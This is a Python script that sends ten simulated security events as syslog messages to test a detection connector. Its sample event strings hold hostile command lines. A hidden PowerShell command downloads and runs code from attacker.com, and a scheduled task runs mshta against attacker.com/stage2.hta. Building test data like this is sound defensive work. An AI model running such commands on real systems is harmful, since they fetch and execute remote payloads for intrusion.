#!/usr/bin/env python3
"""
Windows-Compatible Syslog Event Sender
Sends realistic security events to the syslog connector for testing
Works on Windows, Mac, and Linux (unlike 'logger' command which is Linux-only)
"""

import socket
import sys
import time
from datetime import datetime

# ANSI colors
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Realistic security events for testing
SECURITY_EVENTS = [
    # Process execution events
    '<134>Feb 27 10:15:30 WORKSTATION-01 ProcessCreate: User=DOMAIN\\Admin, CommandLine=powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com\')"',
    
    # Network connection events
    '<134>Feb 27 10:15:31 WORKSTATION-01 NetworkConnection: SourceIP=192.168.1.100, DestIP=8.8.8.8, DestPort=443, Protocol=TCP',
    
    # File creation events
    '<134>Feb 27 10:15:32 WORKSTATION-01 FileCreate: TargetFilename=C:\\Windows\\Temp\\payload.exe, CreationTime=2026-02-27T10:15:32Z',
    
    # Registry modification events
    '<134>Feb 27 10:15:33 WORKSTATION-01 RegistryEvent: TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run, Details=Added persistence',
    
    # DNS query events
    '<134>Feb 27 10:15:34 WORKSTATION-02 DNSQuery: QueryName=malware-c2.evil.com, QueryStatus=NOERROR',
    
    # Authentication events
    '<134>Feb 27 10:15:35 DOMAIN-CONTROLLER LogonEvent: User=DOMAIN\\JohnDoe, LogonType=3, SourceIP=203.0.113.50',
    
    # Firewall block events
    '<135>Feb 27 10:15:36 FIREWALL-01 FirewallEvent: BlockedIP=192.0.2.100, BlockReason=SMB_Exploit_Attempt',
    
    # Suspicious privilege elevation
    '<134>Feb 27 10:15:37 WORKSTATION-03 PrivilegeElevation: User=DOMAIN\\SuspiciousUser, Reason=UAC_Bypass_Detected',
    
    # File deletion events
    '<134>Feb 27 10:15:38 WORKSTATION-01 FileDelete: TargetFilename=C:\\Windows\\System32\\config\\SAM, Timestamp=2026-02-27T10:15:38Z',
    
    # Scheduled task creation
    '<134>Feb 27 10:15:39 DOMAIN-CONTROLLER TaskCreate: TaskName=UpdateChecker, Command=cmd.exe /c mshta.exe http://attacker.com/stage2.hta',
]

def send_syslog(host, port, message, protocol='udp'):
    """Send a syslog message to the specified host and port"""
    try:
        if protocol.lower() == 'udp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
        
        # Syslog messages should be sent as bytes
        sock.sendto(message.encode(), (host, port))
        sock.close()
        return True
    except Exception as e:
        print(f"{Colors.YELLOW}Error sending syslog: {e}{Colors.ENDC}")
        return False

def send_single_event(host, port, message):
    """Send a single event"""
    print(f"{Colors.CYAN}Sending event:{Colors.ENDC} {message[:80]}...")
    success = send_syslog(host, port, message, protocol='udp')
    if success:
        print(f"{Colors.GREEN}✓ Sent{Colors.ENDC}")
    else:
        print(f"{Colors.YELLOW}✗ Failed{Colors.ENDC}")
    return success

def main():
    """Main entry point"""
    if len(sys.argv) < 2:
        print(f"""
{Colors.BOLD}{Colors.CYAN}╔══════════════════════════════════════════════════════════════════╗{Colors.ENDC}
{Colors.BOLD}{Colors.CYAN}║  Windows Syslog Event Sender - Test Syslog Connector              ║{Colors.ENDC}
{Colors.BOLD}{Colors.CYAN}╚══════════════════════════════════════════════════════════════════╝{Colors.ENDC}

{Colors.BOLD}Usage:{Colors.ENDC}
  python send_syslog.py <host> [port] [count]

{Colors.BOLD}Examples:{Colors.ENDC}
  python send_syslog.py localhost
  python send_syslog.py localhost 514
  python send_syslog.py 10.55.56.12 514
  python send_syslog.py localhost 514 5

{Colors.BOLD}Parameters:{Colors.ENDC}
  host  - IP address or hostname (required)
  port  - UDP port (default: 514)
  count - Number of events to send (default: all {len(SECURITY_EVENTS)})

{Colors.BOLD}What it does:{Colors.ENDC}
  Sends realistic security events to a syslog listener (RFC 3164 format)
  Perfect for testing the syslog connector

{Colors.BOLD}Prerequisites:{Colors.ENDC}
  - Syslog connector must be running: python run_connector_advanced.py 5
  - Target host must be listening on port 514 (or custom port)

{Colors.BOLD}Example workflow:{Colors.ENDC}
  1. Terminal 1: python run_connector_advanced.py 5
     (Syslog connector starts listening on 0.0.0.0:514)
  
  2. Terminal 2: python send_syslog.py localhost 514
     (Sends 10 security events)
  
  3. Watch Terminal 1 output:
     [syslog] Event #1: WORKSTATION-01 | T1059 | ...
     [syslog] Event #2: WORKSTATION-01 | T1095 | ...
     etc.

{Colors.BOLD}Event Types Included:{Colors.ENDC}
  - Process execution (suspicious PowerShell)
  - Network connections (outbound to internet)
  - File operations (persistence)
  - Registry modifications (startup)
  - DNS queries (C2 communication)
  - Authentication (lateral movement)
  - Firewall events (blocked traffic)
  - Privilege escalation (detection)
  - File deletion (log tampering)
  - Scheduled tasks (persistence)
""")
        sys.exit(1)
    
    # Parse arguments
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 514
    count = int(sys.argv[3]) if len(sys.argv) > 3 else len(SECURITY_EVENTS)
    
    # Validate count
    count = min(count, len(SECURITY_EVENTS))
    
    print(f"""
{Colors.BOLD}{Colors.GREEN}╔══════════════════════════════════════════════════════════════════╗{Colors.ENDC}
{Colors.BOLD}{Colors.GREEN}║  Sending {count} Security Events to Syslog                          {' ' * (22-len(str(count)))}║{Colors.ENDC}
{Colors.BOLD}{Colors.GREEN}╚══════════════════════════════════════════════════════════════════╝{Colors.ENDC}

{Colors.BOLD}Target:{Colors.ENDC} {host}:{port}
{Colors.BOLD}Events:{Colors.ENDC} {count}/{len(SECURITY_EVENTS)}
{Colors.BOLD}Protocol:{Colors.ENDC} UDP (RFC 3164)

{Colors.BOLD}Sending...{Colors.ENDC}
""")
    
    success_count = 0
    failed_count = 0
    
    for i in range(count):
        event = SECURITY_EVENTS[i]
        if send_single_event(host, port, event):
            success_count += 1
        else:
            failed_count += 1
        
        # Small delay between events (more realistic)
        time.sleep(0.5)
    
    print(f"""
{Colors.BOLD}{Colors.CYAN}════════════════════════════════════════════════════════════════════{Colors.ENDC}
{Colors.BOLD}Summary:{Colors.ENDC}
  ✓ Sent:   {Colors.GREEN}{success_count}{Colors.ENDC}
  ✗ Failed: {Colors.YELLOW}{failed_count}{Colors.ENDC}
  Total:   {count}
{Colors.BOLD}{Colors.CYAN}════════════════════════════════════════════════════════════════════{Colors.ENDC}

{Colors.GREEN}Next step:{Colors.ENDC}
  Watch the syslog connector output for events being processed.
  Events should appear in the form:
  [syslog] Event #1: WORKSTATION-01 | T1059 | 2026-02-27T10:15:30Z

{Colors.YELLOW}Note:{Colors.ENDC}
  If no events appear, check:
  1. Syslog connector is running on the target host
  2. Port 514 (or specified port) is accessible
  3. Firewall allows UDP traffic
  4. Correct host/port in command
""")

if __name__ == "__main__":
    main()
